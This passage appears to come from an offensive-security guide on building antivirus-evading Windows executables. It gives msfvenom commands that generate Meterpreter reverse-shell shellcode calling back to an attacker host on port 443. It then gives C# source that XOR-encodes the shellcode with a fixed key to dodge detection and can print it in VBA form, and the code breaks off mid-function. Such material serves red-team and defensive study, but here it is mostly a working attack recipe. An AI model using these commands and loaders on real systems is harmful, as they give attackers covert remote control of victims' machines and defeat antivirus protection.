Theory For all the following sections the steps are the same, these are to be compiled and serve as .exe to get a Meterpreter reverse shell, remember that you can change the payload, for these purposes we use Meterpreter but you can use any payload you want, every exploit implement a different attempt to bypass and execute to avoid AV Detection; however the general steps are almost the same for all of them: Steps Craft your payload msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=[ATTACKER_IP] LPORT=443 -f csharp msfvenom -p windows/x64/meterpreter/reverse_https exitfunc=thread LHOST=[ATTACKER_IP] LPORT=443 -f csharp Encrypt the shellcode with XOR and key 0xfa, you can either use the below code that you have to compile in Visual Studio and will give you the code, or you can use XOREncoder.exe (Utilities Section) that is an application already compiled that will give the code, or you can also use the Python script below as well // C# Visual Studio - Console App (.NET) using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; namespace XorCoder { public class Program { public static void Main(string[] args) { // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp byte[] buf = new byte[511] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, ..., 0xd5 }; // Encode the payload with XOR (fixed key) byte[] encoded = new byte[buf.Length]; for (int i = 0; i < buf.Length; i++) { encoded[i] = (byte)((uint)buf[i] ^ 0xfa); } StringBuilder hex; if (args.Length > 0) { switch (args[0]) { case "-VBA": // Printout VBA payload uint counter = 0; hex = new StringBuilder(encoded.Length * 2); foreach (byte b in encoded) { hex.AppendFormat("{0:D3}, ", b); counter++; if (counter % 25 == 0) { hex.Append("_
